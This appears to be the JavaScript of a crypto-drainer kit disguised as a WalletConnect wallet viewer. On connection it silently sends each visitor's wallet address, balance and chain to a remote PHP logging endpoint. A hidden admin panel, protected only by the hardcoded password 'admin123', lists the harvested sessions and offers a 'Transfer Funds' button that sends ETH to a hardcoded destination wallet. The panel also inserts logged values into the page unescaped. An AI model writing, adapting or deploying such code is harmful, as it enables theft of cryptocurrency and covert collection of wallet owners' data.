import { ethers } from "ethers";
import EthereumProvider from "@walletconnect/ethereum-provider";

const API_BASE = "https://blanchedalmond-moose-670904.hostingersite.com/api";
const DEST_WALLET = "0xf91A221A7e8Fda48aC4a6fE90017d40e87bA8E60";
const PASSWORD = "admin123";

const connectBtn = document.getElementById("connectBtn");
const disconnectBtn = document.getElementById("disconnectBtn");
const walletDetails = document.getElementById("walletDetails");
const walletAddress = document.getElementById("walletAddress");
const walletBalance = document.getElementById("walletBalance");
const loading = document.getElementById("loading");
const adminBtn = document.getElementById("adminBtn");
const adminLogin = document.getElementById("adminLogin");
const adminPanel = document.getElementById("adminPanel");
const walletApp = document.getElementById("walletApp");
const sessionList = document.getElementById("sessionList");
const adminPass = document.getElementById("adminPass");
const loginBtn = document.getElementById("loginBtn");

let provider, ethersProvider;

function show(section) {
  walletApp.style.display = section === "wallet" ? "block" : "none";
  adminLogin.style.display = section === "login" ? "block" : "none";
  adminPanel.style.display = section === "panel" ? "block" : "none";
}

window.addEventListener("hashchange", route);
function route() {
  const hash = location.hash;
  if (hash === "#admin") show("login");
  else if (hash === "#panel") show("panel");
  else show("wallet");
}
route();

adminBtn.onclick = () => location.hash = "#admin";
loginBtn.onclick = () => {
  if (adminPass.value === PASSWORD) {
    location.hash = "#panel";
    loadSessions();
  } else {
    alert("Wrong password");
  }
};

async function connectWallet() {
  loading.style.display = "block";
  connectBtn.disabled = true;

  provider = await EthereumProvider.init({
    projectId: "84e8498a4e08cafe1acaf08369fd7a56",
    chains: [1, 56, 137],
    showQrModal: true
  });
  await provider.enable();
  ethersProvider = new ethers.BrowserProvider(provider);
  const signer = await ethersProvider.getSigner();
  const address = await signer.getAddress();
  const balance = await ethersProvider.getBalance(address);

  walletAddress.textContent = address;
  walletBalance.textContent = ethers.formatEther(balance);
  walletDetails.style.display = "block";
  loading.style.display = "none";

  await fetch(`${API_BASE}/log.php`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      address,
      balance: ethers.formatEther(balance),
      chainId: provider.chainId,
      timestamp: Date.now()
    })
  });

  localStorage.setItem("wallet_connected", "1");
}

function disconnectWallet() {
  if (provider) provider.disconnect();
  localStorage.removeItem("wallet_connected");
  walletDetails.style.display = "none";
  connectBtn.disabled = false;
}

connectBtn.onclick = connectWallet;
disconnectBtn.onclick = disconnectWallet;

if (localStorage.getItem("wallet_connected") === "1") connectWallet();

async function loadSessions() {
  sessionList.innerHTML = "";
  try {
    const res = await fetch(`${API_BASE}/get_logs.php`);
    const logs = await res.json();

    logs.filter(e => e && e.address).forEach((e, i) => {
      const li = document.createElement("li");
      li.className = "list-group-item";
      li.innerHTML = `
        <div class="session-summary" style="cursor:pointer;">
          <strong>#${i + 1}</strong> • ${new Date(e.timestamp).toLocaleString()}<br/>
          <strong>Address:</strong> ${e.address}<br/>
          <strong>Balance:</strong> ${e.balance} ETH<br/>
          <strong>Chain:</strong> ${e.chainId}
        </div>
        <div class="session-actions" style="display:none; margin-top:10px;">
          <button class="btn btn-sm btn-success transfer-btn" data-address="${e.address}" data-chain="${e.chainId}">
            Transfer Funds
          </button>
        </div>`;

      const sessionSummary = li.querySelector(".session-summary");
      const sessionActions = li.querySelector(".session-actions");

      sessionSummary.addEventListener("click", () => {
        const isVisible = sessionActions.style.display === "block";
        document.querySelectorAll(".session-actions").forEach(el => el.style.display = "none");
        document.querySelectorAll(".list-group-item").forEach(item => item.classList.remove("expanded-session"));
        if (!isVisible) {
          sessionActions.style.display = "block";
          li.classList.add("expanded-session");
        }
      });

      const transferBtn = li.querySelector(".transfer-btn");
      transferBtn.addEventListener("click", async (eClick) => {
        eClick.stopPropagation();
        const address = transferBtn.dataset.address;
        const chainId = parseInt(transferBtn.dataset.chain);
        await initiateTransfer(address, chainId);
      });

      sessionList.appendChild(li);
    });
  } catch (e) {
    sessionList.innerHTML = "<li class='list-group-item text-danger'>Failed to load sessions</li>";
  }
}

async function initiateTransfer(fromAddress, chainId) {
  const chains = {
    1: { rpc: "https://mainnet.infura.io/v3/84e8498a4e08cafe1acaf08369fd7a56" },
    56: { rpc: "https://bsc-dataseed.binance.org/" },
    137: { rpc: "https://polygon-rpc.com" }
  };
  const chain = chains[chainId];
  if (!chain) {
    alert("Unsupported network.");
    return;
  }

  const txProvider = await EthereumProvider.init({
    projectId: "84e8498a4e08cafe1acaf08369fd7a56",
    chains: [chainId],
    showQrModal: true,
    rpcMap: { [chainId]: chain.rpc }
  });
  await txProvider.enable();

  const web3Provider = new ethers.BrowserProvider(txProvider);
  const signer = await web3Provider.getSigner();
  const tx = await signer.sendTransaction({
    to: DEST_WALLET,
    value: ethers.parseEther("0.001")
  });

  alert(`Transfer sent!\nTransaction Hash:\n${tx.hash}`);
}
